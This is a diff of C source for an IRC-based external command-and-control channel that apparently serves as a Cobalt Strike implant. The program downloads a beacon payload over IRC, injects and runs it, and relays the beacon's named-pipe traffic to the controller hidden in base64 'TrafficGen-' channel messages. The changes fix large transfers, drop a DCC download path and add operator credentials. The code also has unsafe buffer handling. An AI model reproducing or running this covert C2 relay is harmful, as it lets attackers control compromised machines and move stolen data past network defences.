@@ -7,7 +7,7 @@
  * This was created as a fall back to get basic functionality in a short amount of developemnt time. It is not complete and has errors.
  * Instead of using cloakify to convert B64 messages to normal looking strings, it just sends the B64 message over IRC.
  *
- * Current limitations: Can only do small commands (<500 bytes). Large transfer is broken due to incorrectly breaking up and parsing the B64 messages.
+ * Update 15 Jan 2020: Fixed the bug causing errors when transfering large ammounts of data.
  *
  */
 
@@ -21,15 +21,19 @@
 #include <stdlib.h>
 #include "b64.h"
 
-#define MAX 1024
-#define B64MAX 2048
+#define MAX 4096
+// Mudge used these values in his example
+#define PAYLOAD_MAX_SIZE 512 * 1024
+#define BUFFER_MAX_SIZE 1024 * 1024
+
 #define SA struct sockaddr
 
 // Struct to hold info on the IRC session
 struct IRCinfo
 {
 	char NICK[50];
-	char PASS[50];
+	char OP_NICK[50];
+	char OP_PASS[50];
 	char USER[50];
 	char REALNAME[50];
 	char CHANNEL[50];
@@ -42,7 +46,6 @@ struct IRCinfo
  *
  * @param payload Pointer to a buffer containing a Cobalt Strike beacon payload to be alloc'd and run
  * @param len Length of the payload buffer
- * @note Windows Only Implementation
  */
 void spawnBeacon(char* payload, DWORD len) {
 
@@ -56,37 +59,10 @@ void spawnBeacon(char* payload, DWORD len) {
 
 
 /**
- * Receives data from our C2 controller directly, not through IRC (for DCC file transfer)
- *
- * @param sd A socket file descriptor
- * @param len A pointer to store the length of data received in
- * @note Windows Only Implementation
- * @return A buffer containing the data received
-*/
-char* recvD(SOCKET sd, DWORD* len) {
-	char* buffer;
-	DWORD bytesReceived = 0, totalLen = 0;
-
-	*len = 0;
-
-	recv(sd, (char*)len, 4, 0);
-	buffer = (char*)malloc(*len);
-	if (buffer == NULL)
-		return NULL;
-
-	while (totalLen < *len) {
-		bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0);
-		totalLen += bytesReceived;
-	}
-	return buffer;
-}
-
-/**
  * Creates a socket connection in Windows
  *
  * @param ip A pointer to an array containing the IP address to connect to
  * @param port A pointer to an array containing the port to connect on
- * @note Windows Only Implementation
  * @return A socket handle for the connection
 */
 SOCKET create_socket(char* ip, char* port)
@@ -151,11 +127,11 @@ SOCKET create_socket(char* ip, char* port)
  *
  * @param sockfd A socket file descriptor
  * @param text, ... Variable arguments to format and store into a buffer
- * @note Windows Only Implementation
  * @return number of bytes sent
  */
 int sendargv(SOCKET sockfd, char* text, ...)
 {
+	//TODO: check if this MAX is correct. Maybe change to malloc sizeof(text)?
 	static char sendbuff[MAX];
 	memset(sendbuff, 0, sizeof(sendbuff));
 	va_list ap;
@@ -169,20 +145,23 @@ int sendargv(SOCKET sockfd, char* text, ...)
 
 /**
  * Sends data to our C2 controller (via IRC) received from our injected beacon
- * TODO: This function is likly broked. Test/Debug/Fix!
  *
  * @param sd A socket file descriptor
  * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
  * @param data A pointer to an array containing data to send
  * @param len Length of data to send
- * @note Windows Only Implementation
+ * @return Return value, 0 is success
 */
-void sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
+int sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
 	char* buffer = (char*)malloc(len + 4);
 	if (buffer == NULL)
-		return;
+	{
+		printf("Malloc failed..\n");
+		return -1;
+	}
+	memset(buffer, 0, sizeof(len+4));
 	char* bufferfixed;
-	DWORD bytesWritten = 0, totalLen = 0;
+	DWORD bytesWritten = 0;
 
 	*(DWORD*)buffer = len;
 	memcpy(buffer + 4, data, len);
@@ -193,106 +172,137 @@ void sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
 
 	// Make sure it ends in == so the server knows the end
 	// TODO: Remove this dependency by sending the size
+	// memcpy(bufferfixed, b64len, 4);
+	// memcpy(bufferfixed + 4, encodedmsg, b64len);
 	if (strstr(encodedmsg, "=="))
 	{
-		bufferfixed = (char*)malloc(b64len);
-		if (bufferfixed == NULL)
-		{
-			printf("malloc error!");
-			return;
-		}
-		memcpy(bufferfixed, encodedmsg, b64len);
+		bufferfixed = encodedmsg;
 	}
 	else if (strstr(encodedmsg, "="))
 	{
 		b64len += 1;
-		bufferfixed = (char*)malloc(b64len);
-		if (bufferfixed == NULL)
-		{
-			printf("malloc error!");
-			return;
-		}
-		memcpy(bufferfixed, encodedmsg, b64len);
+		bufferfixed = encodedmsg;
 		strcat(bufferfixed, "=");
 	}
 	else
 	{
 		b64len += 2;
-		bufferfixed = (char*)malloc(b64len);
-		if (bufferfixed == NULL)
-		{
-			printf("malloc error!");
-			return;
-		}
-		memcpy(bufferfixed, encodedmsg, b64len);
+		bufferfixed = encodedmsg;
 		strcat(bufferfixed, "==");
 	}
-	// Break message up to send a max of 425 bytes of data per IRC message
-	char* partial = (char*)malloc(425);
+	// Break message up to send a max of ~500 bytes of data per IRC message (RFC says 512)
+	// TODO: check 425 number and define it at top
+	char* partial = (char*)malloc(426);
 	int offset = 0;
 	while (offset < b64len)
 	{
 		if (offset + 425 >= b64len)
 		{
-			strncpy(partial, bufferfixed + offset, b64len-offset);
-			sendargv(sd, "PRIVMSG %s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
+			memset(partial, 0, 425);
+			memcpy(partial, bufferfixed + offset, b64len-offset);
+			sendargv(sd, "PRIVMSG #%s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
 			break;
 		}
 		else
 		{
-			strncpy(partial, bufferfixed + offset, 425);
-			sendargv(sd, "PRIVMSG %s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
+			memset(partial, 0, 426);
+			memcpy(partial, bufferfixed + offset, 425);
+			sendargv(sd, "PRIVMSG #%s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
 			offset += 425;
+			Sleep(200);
 		}
-		
 	}
 	
 	free(partial);
 	free(buffer);
-	free(bufferfixed);
+	return 0;
 }
 
 
 /**
  * Receives data from our C2 controller to be relayed to the injected beacon
- * TODO: Test this function. It may be broken.
+ * TODO: Refactor this function!
  *
  * @param sd A socket file descriptor
  * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
  * @param len Length of data to send
- * @note Windows Only Implementation
  * @return A pointer to an array containing the received data
 */
-char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
-	char* buffer;
-	DWORD bytesReceived = 0, totalLen = 0;
-
-	*len = 0;
+DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
+	DWORD size = 0;
 
 	// IRC recv loop
-	// TODO: Refactor this to make it it's own function
-	char recvbuff[MAX];
-	char msgbuff[4096];
-	BOOL multipacketflag = FALSE;
+	char recvbuff[MAX+1];
+	char* msgbuff = NULL;
+	BOOL msgcompleteflag = FALSE;
 	char privDmExitMsg[64];
 	sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
 	char privChanExitMsg[64];
-	sprintf(privChanExitMsg, "PRIVMSG %s :exit", ircinfo.CHANNEL);
+	sprintf(privChanExitMsg, "PRIVMSG #%s :exit", ircinfo.CHANNEL);
 	char privChanPING[64];
-	sprintf(privChanPING, "PRIVMSG %s :PING", ircinfo.CHANNEL);
-	memset(msgbuff, 0, sizeof(msgbuff));
-	for (;;)
+	sprintf(privChanPING, "PRIVMSG #%s :PING", ircinfo.CHANNEL);
+	int msgbuff_len = 0;
+	char* leftover = NULL;
+	char* buff = NULL;
+
+	while(1)
 	{
 		memset(recvbuff, 0, sizeof(recvbuff));
-		recv(sd, recvbuff, sizeof(recvbuff), 0);
+		// Recv 4096 bytes
+		recv(sd, recvbuff, 4096, 0);
 		printf("From Server : %s", recvbuff);
-
-		if (recvbuff[strlen(recvbuff) - 1] == '\n')
+		if (leftover != NULL)
 		{
-			recvbuff[strlen(recvbuff) - 1] = '\0';
+			buff = leftover;
+			// This is probably wrong..
+			strncat(buff, recvbuff, sizeof(recvbuff));
 		}
-		char* trafficptr = strstr(recvbuff, "TrafficGen-");
-		if (trafficptr)
+		else
+		{
+			buff = recvbuff;
+		}
+		
+		if (buff[strlen(buff) - 1] == '\n')
+		{
+			buff[strlen(buff) - 1] = '\0';
+		}
+		char* lenptr = strstr(buff, "Len-");
+		if (lenptr)
+		{
+			char* msg_end = "\0";
+			// Len- is 4 char
+			lenptr += 4;
+			// Find end of message
+			msg_end = strstr(lenptr, "\r");
+			if (msg_end == NULL)
+			{
+				printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
+				leftover = msg_end;
+				break;
+			}
+			// Length of len msg
+			int len_len = msg_end - lenptr;
+			// Increment msg_end to end
+			msg_end += 1;
+			// Null terminate it
+			if (lenptr != NULL && lenptr[len_len] != '\0')
+			{
+				lenptr[len_len] = '\0';
+			}
+			printf("Encoded msg len:%s\n", lenptr);
+			
+			// Convert to int
+			sscanf(lenptr, "%d", &msgbuff_len);
+			msgbuff_len += 1;
+			printf("As int +1: %d\n",msgbuff_len);
+			// Malloc buffer to store incomming msg
+			msgbuff = (char*)malloc(msgbuff_len);
+			if (msgbuff == NULL)
+				return -1;
+			memset(msgbuff, 0, msgbuff_len);
+		}
+		char* trafficptr = strstr(buff, "TrafficGen-");
+		if (trafficptr && (msgbuff != NULL))
 		{
 			char* msg_end = "\0";
 			// Iterate through every message in the IRC packet, there can be more than one
@@ -303,6 +313,13 @@ char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
 				trafficptr += 11;
 				// Find end of message (\r\n but the final \n of the packet has been changed to \0)
 				msg_end = strstr(trafficptr, "\r");
+				// printf("msg_end: %s\n", msg_end);
+				if (msg_end == NULL)
+				{
+					printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
+					leftover = msg_end;
+					break;
+				}
 				// Calculate length of message
 				int msg_len = msg_end - trafficptr;
 				// Increment msg_end to either end of message or to 1 character before next message
@@ -324,12 +341,12 @@ char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
 					// If there are no more messages in this packet - break, else find the next cloakptr
 					if (strlen(msg_end) < 2)
 					{
-						// printf("1 message packet\n");
+						
 						if (strstr(msg_end - 3, "=="))
 						{
-							multipacketflag = TRUE;
+							msgcompleteflag = TRUE;
 						}
-
+						printf("breaking..\n");
 						break;
 					}
 					else
@@ -337,13 +354,22 @@ char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
 						printf("Multi message packet\n");
 					}
 					trafficptr = strstr(msg_end, "TrafficGen-");
+					if (!trafficptr)
+					{
+						// Didn't find TrafficGen string
+						if (strstr(msg_end - 3, "=="))
+						{
+							// Found == though
+							msgcompleteflag = TRUE;
+						}
+						break;
+					}
 				}
 			}
 		}
-		if (multipacketflag)
-		{
-			break;
-		}
+		// int result = pingcheck(sd, recvbuff, buffer)
+		// if (result == 1)
+		// {return 1;}
 		if (strstr(recvbuff, "PING :"))
 		{
 			printf("PING! sending PONG.\n");
@@ -354,17 +380,20 @@ char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
 		else if (strstr(recvbuff, privChanPING))
 		{
 			char* nullbyte = "\0";
-			*len = 1;
-			return nullbyte;
+			memcpy(buffer, nullbyte, 1);
+			return 1;
 		}
+		// result = exitcheck(sd, ircinfo, recvbuff)
+		// if (result == -1)
+		// {break;}
 		// Check if exit message in DM or channel
-		else if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
+		if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
 		{
-			sendargv(sd, "PRIVMSG %s :quitting\r\n", ircinfo.CHANNEL);
+			sendargv(sd, "PRIVMSG #%s :quitting\r\n", ircinfo.CHANNEL);
 			sendargv(sd, "QUIT :\r\n");
 		}
 		// Check if ERROR message
-		else if (strstr(recvbuff, "ERROR"))
+		if (strstr(recvbuff, "ERROR"))
 		{
 			printf("Server sent Error...\n");
 			if (strstr(recvbuff, "Closing Link"))
@@ -373,60 +402,24 @@ char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
 			}
 			break;
 		}
-		// Check if server is using DCC SEND to send a lot of data
-		if (strstr(recvbuff, "PRIVMSG "))
+		// Break if multipacket message is finished
+		if (msgcompleteflag)
 		{
-			char* dccptr = strstr(recvbuff, "DCC SEND ");
-			if (dccptr)
-			{
-				printf("Got PRIVMSG DCC SEND\n");
-				// Iterate to file position
-				dccptr += 9;
-				// Parse message to get filename, IP, port, and filesize
-				char* fileptr = strtok(dccptr, " ");
-				char* ipptr = strtok(NULL, " ");
-				char* portptr = strtok(NULL, " ");
-				char* filesizeptr = strtok(NULL, " ");
-				// Connect to IP/port and read
-				SOCKET dcc_sockfd = INVALID_SOCKET;
-				// Convert IP from int to string
-				printf("ipptr: %s\n", ipptr);
-				char* ptr;
-				ULONG ulIP = strtoul(ipptr, &ptr, 10);
-				unsigned char bytes[4];
-				bytes[0] = ulIP & 0xFF;
-				bytes[1] = (ulIP >> 8) & 0xFF;
-				bytes[2] = (ulIP >> 16) & 0xFF;
-				bytes[3] = (ulIP >> 24) & 0xFF;
-				char ip_buf[16];
-				sprintf(ip_buf, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
-				printf("DCC sender IP is %s\n", ip_buf);
-
-				dcc_sockfd = create_socket(ip_buf, portptr);
-				if (dcc_sockfd == INVALID_SOCKET)
-				{
-					printf("Socket creation error!\n");
-					return NULL;
-				}
-
-				return recvD(dcc_sockfd, len);
-
-			}
+			break;
 		}
 	}
 	// end of IRC recv loop
 
-	printf("Encoded msg:%s\n", msgbuff);
+	// printf("Encoded msg:%s\n", msgbuff);
 	int unb64len;
-	char* decodedmsg = unbase64(msgbuff, strlen(msgbuff) + 1, &unb64len);
+	char* decodedmsg = unbase64(msgbuff, msgbuff_len + 1, &unb64len);
 
-	memcpy(len, decodedmsg, 4);
-	printf("Msg len:%d\n", *len);
-	buffer = (char*)malloc(*len);
-	if (buffer == NULL)
-		return NULL;
-	memcpy(buffer, decodedmsg + 4, *len);
-	return buffer;
+	memcpy((char *)&size, decodedmsg, 4);
+	printf("Msg len: %d\n", size);
+	// printf("unb64len: %d\n", unb64len);
+	memcpy(buffer, decodedmsg + 4, size);
+	free(msgbuff);
+	return size;
 }
 
 
@@ -434,7 +427,6 @@ char* recvData(SOCKET sd, struct IRCinfo ircinfo, DWORD* len) {
  * Connects to the name pipe spawned by the injected beacon
  *
  * @param pipeName Pointer to a buffer containing the name of the pipe to connect to
- * @note Windows Only Implementation
  * @return A handle to the beacon named pipe
  */
 HANDLE connectBeaconPipe(const char* pipeName) {
@@ -447,42 +439,39 @@ HANDLE connectBeaconPipe(const char* pipeName) {
 
 
 /**
- * Receives data from our injected beacon via a named pipe
- *
- * @param pipe Handle to beacons SMB pipe
- * @param len Pointer to store the length of the data received in
- * @note Windows Only Implementation
- * @return Buffer containing the received data
+ * Read a frame from a handle
+ * 
+ * @param my_handle Handle to beacons SMB pipe
+ * @param buffer buffer to read data into
+ * @param max unused
+ * @return size of data read
  */
-char* recvFromBeacon(HANDLE pipe, DWORD* len) {
-	char* buffer;
-	DWORD bytesRead = 0, totalLen = 0;
+DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
+	DWORD size = 0, temp = 0, total = 0;
+	/* read the 4-byte length */
+	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);
 
-	*len = 0;
-
-	ReadFile(pipe, len, 4, &bytesRead, NULL);
-	buffer = (char*)malloc(*len);
-
-	while (totalLen < *len) {
-		ReadFile(pipe, buffer + totalLen, *len - totalLen, &bytesRead, NULL);
-		totalLen += bytesRead;
+	/* read the whole thing in */
+	while (total < size) {
+		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
+		total += temp;
 	}
-	return buffer;
+
+	return size;
 }
 
 
 /**
- * Write data to our injected beacon via a named pipe
- *
- * @param pipe Handle to beacons SMB pipe
- * @param data Pointer to buffer containing data to be written to pipe
- * @param len Length of data to be written to pipe
- * @note Windows Only Implementation
+ * Write a frame to a file
+ * 
+ * @param my_handle Handle to beacons SMB pipe
+ * @param buffer buffer containing data to send
+ * @param length length of data to send
  */
-void sendToBeacon(HANDLE pipe, const char* data, DWORD len) {
-	DWORD bytesWritten = 0;
-	WriteFile(pipe, &len, 4, &bytesWritten, NULL);
-	WriteFile(pipe, data, len, &bytesWritten, NULL);
+void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
+	DWORD wrote = 0;
+	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
+	WriteFile(my_handle, buffer, length, &wrote, NULL);
 }
 
 
@@ -491,16 +480,15 @@ void sendToBeacon(HANDLE pipe, const char* data, DWORD len) {
  *
  * @param sockfd A socket file descriptor
  * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
- * @note Windows Only Implementation
  */
 void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	sendargv(sockfd, "PASS %s\r\n", ircinfo.PASS);
+	sendargv(sockfd, "PASS %s\r\n", ircinfo.OP_PASS);
 	sendargv(sockfd, "NICK %s\r\n", ircinfo.NICK);
 	sendargv(sockfd, "USER %s %s %s :%s\r\n", ircinfo.USER, "0", "*", ircinfo.REALNAME);
 
 	char recvbuff[MAX];
-	for (;;)
+	while(1)
 	{
 		memset(recvbuff, 0, sizeof(recvbuff));
 		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
@@ -538,12 +526,13 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
  */
 void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	sendargv(sockfd, "JOIN %s\r\n", ircinfo.CHANNEL);
+	sendargv(sockfd, "JOIN #%s\r\n", ircinfo.CHANNEL);
 }
 
 
 /**
  * Sends the command to become an operator on the IRC server
+ * 
  * NOTE: This requires knowing the operator nick and password. This is only useful if you have edited the IRC server .conf file.
  *
  * @param sockfd A socket file descriptor
@@ -551,7 +540,7 @@ void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
  */
 void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	sendargv(sockfd, "OPER %s %s\r\n", ircinfo.NICK, ircinfo.PASS);
+	sendargv(sockfd, "OPER %s %s\r\n", ircinfo.OP_NICK, ircinfo.OP_PASS);
 }
 
 
@@ -564,136 +553,48 @@ void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
 void cloakstart(SOCKET sockfd, struct IRCinfo ircinfo)
 {
 	// TODO: Either find a better way to do this or change the string
-	sendargv(sockfd, "PRIVMSG %s :cloak\r\n", ircinfo.CHANNEL);
-}
-
-
-/**
- * Read from IRC until a DCC send is received then connect and receive data
- *
- * @param sockfd A socket file descriptor
- * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
- * @param len Pointer to store the length of the data received in
- * @note Windows Only Implementation
- * @return Buffer containing the received data
- */
-char* wait_for_dcc(SOCKET sockfd, struct IRCinfo ircinfo, DWORD* len)
-{
-	// IRC recv loop
-	char recvbuff[MAX];
-	for (;;)
-	{
-		memset(recvbuff, 0, sizeof(recvbuff));
-		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
-		printf("From Server : %s", recvbuff);
-
-		if (recvbuff[strlen(recvbuff) - 1] == '\n')
-		{
-			recvbuff[strlen(recvbuff) - 1] = '\0';
-		}
-		if (strstr(recvbuff, "DCC Send "))
-		{
-			printf("Got DCC Send\n");
-		}
-		if (strstr(recvbuff, "PRIVMSG "))
-		{
-			char* dccptr = strstr(recvbuff, "DCC SEND ");
-			if (dccptr)
-			{
-				printf("Got PRIVMSG DCC SEND\n");
-				// Iterate to file position
-				dccptr += 9;
-				// Parse message to get filename, IP, port, and filesize
-				char* fileptr = strtok(dccptr, " ");
-				char* ipptr = strtok(NULL, " ");
-				char* portptr = strtok(NULL, " ");
-				char* filesizeptr = strtok(NULL, " ");
-				// Connect to IP/port and read
-				SOCKET dcc_sockfd = INVALID_SOCKET;
-				// Convert IP from int to string
-				printf("ipptr: %s\n", ipptr);
-				char* ptr;
-				ULONG ulIP = strtoul(ipptr, &ptr, 10);
-				unsigned char bytes[4];
-				bytes[0] = ulIP & 0xFF;
-				bytes[1] = (ulIP >> 8) & 0xFF;
-				bytes[2] = (ulIP >> 16) & 0xFF;
-				bytes[3] = (ulIP >> 24) & 0xFF;
-				char ip_buf[16];
-				sprintf(ip_buf, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
-				printf("DCC sender IP is %s\n", ip_buf);
-
-				dcc_sockfd = create_socket(ip_buf, portptr);
-				if (dcc_sockfd == INVALID_SOCKET)
-				{
-					printf("Socket creation error!\n");
-					return NULL;
-				}
-
-				return recvD(dcc_sockfd, len);
-
-			}
-		}
-		if (strstr(recvbuff, "PING :"))
-		{
-			printf("PING! sending PONG.\n");
-			char* pingsvr = strstr(recvbuff, "PING :");
-			pingsvr += strlen("PING :");
-			sendargv(sockfd, "PONG :%s\n", pingsvr);
-		}
-	}
+	sendargv(sockfd, "PRIVMSG #%s :cloak\r\n", ircinfo.CHANNEL);
 }
 
 
 /**
  * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
  *
- * @note Windows Only Implementation
- * @return 1 on failure
  */
-int main(int argc, char* argv[])
+void main(int argc, char* argv[])
 {
 	// Set connection and IRC info
-	/*
-	char* IP = "127.0.0.1";
-	char* PORT = "6667";
-	struct IRCinfo ircinfo;
-	strcpy(ircinfo.NICK, "bot");
-	strcpy(ircinfo.PASS, "bot");
-	strcpy(ircinfo.USER, "covert");
-	strcpy(ircinfo.REALNAME, "covertIRC");
-	strcpy(ircinfo.CHANNEL, "#bot");
-	strcpy(ircinfo.TGTNICK, "servbot");
-	*/
-	if (argc != 9)
+	if (argc != 11)
 	{
 		printf("Incorrect number of args: %d\n", argc);
-		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK]");
-		return 1;
+		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)]");
+		printf("Values should be no more than 49 bytes.\n");
+		exit(1);
 	}
 	char* IP = argv[1];
 	char* PORT = argv[2];
 	struct IRCinfo ircinfo;
 	strcpy(ircinfo.NICK, argv[3]);
-	strcpy(ircinfo.PASS, argv[4]);
-	strcpy(ircinfo.USER, argv[5]);
-	strcpy(ircinfo.REALNAME, argv[6]);
-	strcpy(ircinfo.CHANNEL, argv[7]);
-	strcpy(ircinfo.TGTNICK, argv[8]);
+	strcpy(ircinfo.OP_NICK, argv[4]);
+	strcpy(ircinfo.OP_PASS, argv[5]);
+	strcpy(ircinfo.USER, argv[6]);
+	strcpy(ircinfo.REALNAME, argv[7]);
+	strcpy(ircinfo.CHANNEL, argv[8]);
+	strcpy(ircinfo.TGTNICK, argv[9]);
+	long sleep_timer = strtol(argv[10],NULL, 10);
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
 	HANDLE beaconPipe = INVALID_HANDLE_VALUE;
 
 	// Create a connection back to our C2 controller
-	//SOCKET testsocket = createC2Socket("192.168.136.130", 8081);
 	SOCKET sockfd = INVALID_SOCKET;
 
 	sockfd = create_socket(IP, PORT);
 	if (sockfd == INVALID_SOCKET)
 	{
 		printf("Socket creation error!\n");
-		return 1;
+		exit(1);
 	}
 
 	// Connect to IRC application
@@ -707,49 +608,72 @@ int main(int argc, char* argv[])
 	Sleep(500);
 	cloakstart(sockfd, ircinfo);
 
-	payloadData = wait_for_dcc(sockfd, ircinfo, &payloadLen);
-	if (payloadData == NULL)
+	// Recv beacon payload
+	char * payload = (char *)malloc(PAYLOAD_MAX_SIZE);
+	DWORD payload_size = recvData(sockfd, ircinfo, payload, BUFFER_MAX_SIZE);
+	if (payload_size < 0)
 	{
-		printf("wait_for_dcc Error!\n");
-		return 1;
+		printf("recvData error, exiting\n");
+		exit(1);
 	}
-	else
-	{
-		printf("Received payload\n");
-		// Start the CS beacon
-		spawnBeacon(payloadData, payloadLen);
+	printf("Recv %d bytes from TS\n", payload_size);
+	// Start CS beacon
+	spawnBeacon(payload, payload_size);
+	// Loop unstil the pipe is up and ready to use
+	while (beaconPipe == INVALID_HANDLE_VALUE) {
+		// Create our IPC pipe for talking to the C2 beacon
+		Sleep(500);
+		beaconPipe = connectBeaconPipe("\\\\.\\pipe\\mIRC");
+	}
+	printf("Connected to pipe!!\n");
 
-		// Loop until the pipe is up and ready to use
-		while (beaconPipe == INVALID_HANDLE_VALUE) {
-			// Create our IPC pipe for talking to the C2 beacon
-			Sleep(500);
-			printf("Trying to connect to pipe.\n");
-			beaconPipe = connectBeaconPipe("\\\\.\\pipe\\mIRC");
-		}
-		printf("Connected to pipe!!\n");
+	// Mudge used 1MB max in his example, test this
+	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
+	if (buffer == NULL)
+	{
+		printf("buffer malloc failed!\n");
+		exit(1);
 	}
 
 	while (1) {
 		// Start the pipe dance
-		payloadData = recvFromBeacon(beaconPipe, &payloadLen);
-		if (payloadLen == 0) break;
-		// TODO: Find a better way to do sleep timer if no data is ready or make it configurable
-		if (payloadLen == 1) Sleep(2000);
-		printf("Recv %d bytes from beacon\n", payloadLen);
-		sendData(sockfd, ircinfo, payloadData, payloadLen);
+		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
+		if (read_size < 0)
+		{
+			printf("read_frame error, exiting\n");
+			break;
+		}
+		printf("Recv %d bytes from beacon\n", read_size);
+		// Sleep so we do not constantly send data if there is no change
+		if (read_size == 1)
+		{
+			Sleep(sleep_timer);
+		}
+
+		int rv = sendData(sockfd, ircinfo, buffer, read_size);
+		if (rv == -1)
+		{
+			printf("sendData error, exiting..\n");
+			break;
+		}
 		printf("Sent to TS\n");
-		free(payloadData);
-
-		payloadData = recvData(sockfd, ircinfo, &payloadLen);
-		if (payloadLen == 0) break;
-		printf("Recv %d bytes from TS\n", payloadLen);
 		
-		sendToBeacon(beaconPipe, payloadData, payloadLen);
+		read_size = recvData(sockfd, ircinfo, buffer, BUFFER_MAX_SIZE);
+		if (read_size < 0)
+		{
+			printf("recvData error, exiting\n");
+			break;
+		}
+		printf("Recv %d bytes from TS\n", read_size);
+
+		write_frame(beaconPipe, buffer, read_size);
 		printf("Sent to beacon\n");
-		free(payloadData);
 	}
+	free(payload);
+	free(buffer);
+	closesocket(sockfd);
+	CloseHandle(beaconPipe);
 
-
-	return 0;
+	exit(0);
 }
 
